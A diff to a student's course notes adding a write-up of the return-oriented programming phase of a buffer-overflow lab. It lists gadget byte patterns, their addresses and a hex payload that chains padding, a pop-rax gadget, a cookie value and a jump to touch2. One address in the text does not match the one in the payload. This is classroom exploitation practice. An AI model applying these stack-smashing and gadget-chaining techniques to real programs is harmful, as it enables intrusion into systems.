@@ -86,8 +86,31 @@ This was figured out by using `disas`, `i r` and `ni` a lot.
 
 #### part b - asmlab
 
-In phase two I checked out the gadgets in r_target.
-I ended up identifying a call to 58 which pops from the top of the stack to $rax.
+In phase two I first I created a txt file with my padding.
+Then after looking at asmlab.pdf page 11 I identified that some of the following function pairs should be identfied (to get the cookie popped from the stack into rdi):
+
+* 58 - 48 89 c7
+* 59 - 48 89 cf
+* 5a - 48 89 d7
+* etc.
+
+The one I identfieid was 58 and 48 89 c7, located at `402683` and `20268f`.
+These where chosen as the instructions behind them where irrelevant.
+So now I have my padding, then the pop into rax, and last rax into rdi (as this is where instructions will be exectuted).
+Then lastly I could add the address to `touch2` to ensure that I would jump to it.\
+My payload therefore ended up looking as following:
+
+```txt
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+83 26 40 00 00 00 00 00
+76 7c cd 7f 00 00 00 00
+8f 26 40 00 00 00 00 00
+ca 24 40 00 00 00 00 00
+```
 
 ### prflab
 
